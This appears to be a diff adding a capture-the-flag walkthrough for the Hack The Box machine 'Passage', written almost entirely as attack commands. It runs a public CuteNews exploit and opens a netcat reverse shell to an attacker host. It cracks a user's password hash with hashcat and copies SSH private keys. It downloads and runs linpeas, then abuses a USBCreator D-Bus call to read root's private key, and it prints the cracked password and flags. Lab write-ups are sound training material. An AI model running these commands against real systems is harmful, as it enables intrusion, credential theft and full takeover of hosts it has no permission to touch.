@@ -1,0 +1,115 @@
+nmap -sS 10.10.10.206
+#two open ports 
+#ssh 
+#http
+
+#open 
+http://10.10.10.206
+#view page source
+
+#got two mail id 
+nadav@passage.htb
+paul@passage.htb
+
+
+#add the ip to the host file 
+nano /etc/hosts
+	10.10.10.206 passage.htb
+
+#click the rss in web page 
+#got something http://passage.htb/CuteNews
+#google search for cutenews and got the exploit
+#https://www.exploit-db.com/exploits/46698
+#https://raw.githubusercontent.com/CRFSlick/CVE-2019-11447-POC/master/CVE-2019-11447.py
+
+#cutenews has a login page at http://passage.htb/CuteNews/index.php
+#got the login page 
+#register for new user username:admin1 password:password
+
+python3 CVE-2019-11447.py admin1 password http://10.10.10.206/CuteNews/index.php
+
+
+#got the unstale shell 
+id
+#www-data
+
+#change it into using nc 
+#victim machine
+nc -e /bin/bash <attackmachineip> 444
+
+#attack machine
+nc -lvnp 4444
+ 
+
+
+#now you the the connected
+#use python to make it stable 
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+find . -name "*txt"
+#got some info 
+#/var/www/html/CuteNews/cdata/users/users.txt
+ls /var/www/html/CuteNews/cdata/users
+
+#lines file is strange 
+cat /var/www/html/CuteNews/cdata/users/lines
+
+#some base64 hashes are the 
+#get the hashes and decode
+
+echo 'base64hash' | base64 -d
+#got some information about the use paul and sha256 hash
+#decode the sha256 hash with hashcat
+hashcat -m 1400 'sha256hash' rockyou.txt --force
+#got the password for the paul user
+#username:paul
+#password:atlanta1
+
+su paul
+#enter password as atlanta1
+#now login to the paul user 
+cat user.txt
+40341b6aa8a3fa18e223dccb860222bf
+
+
+#now another user is there nadav
+#look all the file in the paul user
+#paul and nadav configured the password less ssh login between them
+ls ~/.ssh/
+cat id_rsa
+#copy the private key of paul to your attack system save the file as paul_id_rsa 
+chmod 600 paul_id_rsa
+ssh -i paul_id_rsa paul@10.10.10.206
+#check for authorized_keys file
+cat authorized_keys
+#from paul to nadav no need password through ssh
+
+ssh nadav@passage.htb
+#logged in to the nadav
+
+
+#privilege escalation using linpeas
+#https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
+#to use the file
+
+wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+#got more information 
+
+ps aux
+#check for root user running process
+
+cd /tmp
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
+ls -l pwn
+cat pwn
+#now you got the private key for the root user copy and save in your attack machine as root_id_rsa
+chmod 600 root_id_rsa
+ssh -i root_id_rsa root@10.10.10.206
+#got the root shell
+#cat root.txt
+01dbccc38b864089cb6726a2b67bd47a
+
